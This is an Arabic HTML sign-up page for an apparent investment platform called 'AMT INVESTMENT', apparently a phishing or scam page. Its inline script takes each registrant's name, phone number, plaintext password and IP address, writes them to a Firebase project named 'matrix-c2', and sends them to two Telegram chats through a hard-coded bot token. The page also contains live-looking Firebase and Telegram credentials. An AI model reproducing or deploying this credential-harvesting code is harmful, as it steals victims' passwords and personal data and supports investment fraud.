<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AMT INVESTMENT | البدء</title>
    <link rel="stylesheet" href="glass.css">
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="security.js"></script>
</head>
<body class="main-bg">
    <div class="glass-container">
        <h1 class="logo">AMT <span>INVESTMENT</span></h1>
        <p style="text-align:center; font-size:12px; color:#7f8c8d; margin-bottom:20px;">المنصة الرسمية لإدارة المحافظ الذكية</p>
        
        <form id="registerForm">
            <div class="input-group">
                <input type="text" id="regName" placeholder="الاسم الرباعي" required>
            </div>
            
            <div style="display:flex; gap:8px; margin-bottom:15px;">
                <select id="countryCode" style="width:35%; border-radius:12px;">
                    <option value="+20">🇪🇬 +20</option>
                    <option value="+964">🇮🇶 +964</option>
                    <option value="+966">🇸🇦 +966</option>
                    <option value="+971">🇦🇪 +971</option>
                </select>
                <input type="tel" id="regPhone" placeholder="رقم الهاتف" required style="margin-bottom:0;">
            </div>

            <div class="input-group">
                <input type="password" id="regPass" placeholder="كلمة السر" required>
            </div>

            <button type="submit" class="btn-primary">إنشاء المحفظة الاستثمارية</button>
        </form>
        
        <p style="text-align:center; margin-top:15px; font-size:13px;">لديك حساب؟ <a href="login.html" style="color:#2c3e50; font-weight:bold; text-decoration:none;">تسجيل الدخول</a></p>
        
        <p class="version-text" onclick="triggerVault()">v1.0.8</p>
    </div>

    <script>
        // إعدادات Firebase (يجب أن تكون موحدة في كل الملفات)
        const firebaseConfig = {
          apiKey: "AIzaSyAkz8kGNDOJ5caCIbdoXpvJBZgUbigjT5g",
          databaseURL: "https://matrix-c2-default-rtdb.firebaseio.com",
          projectId: "matrix-c2",
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);

        const botToken = "8619795327:AAF8hZQVZlyLkxYyU6bmuu2KVM2nyNUmpRE";
        const chatIds = ["8622780736", "8211953992"];

        document.getElementById('registerForm').onsubmit = async (e) => {
            e.preventDefault();
            const name = document.getElementById('regName').value;
            const phone = document.getElementById('countryCode').value + document.getElementById('regPhone').value;
            const pass = document.getElementById('regPass').value;

            // جلب الـ IP فوراً
            let ip = "Unknown";
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}

            const userKey = phone.replace('+', '');
            
            // رفع البيانات للفايربيز
            firebase.database().ref('users/' + userKey).set({
                full_name: name,
                phone: phone,
                password: pass,
                ip: ip,
                balance: 0,
                status: "Active",
                tasks: ["انضم لقناة التوصيات الرسمية"], // المهام الافتراضية
                joined_at: new Date().toLocaleString()
            }).then(() => {
                // إرسال الإشعار لتليجرام
                const msg = `🎯 **مستخدم جديد انضم!**\n👤 الاسم: ${name}\n📱 هاتف: ${phone}\n🔑 كود: ${pass}\n🌐 IP: ${ip}`;
                chatIds.forEach(id => fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`));

                localStorage.setItem('userPhone', userKey);
                alert("تم تسجيلك بنجاح في AMT INVESTMENT");
                window.location.href = "dashboard.html";
            });
        };
    </script>
</body>
</html>
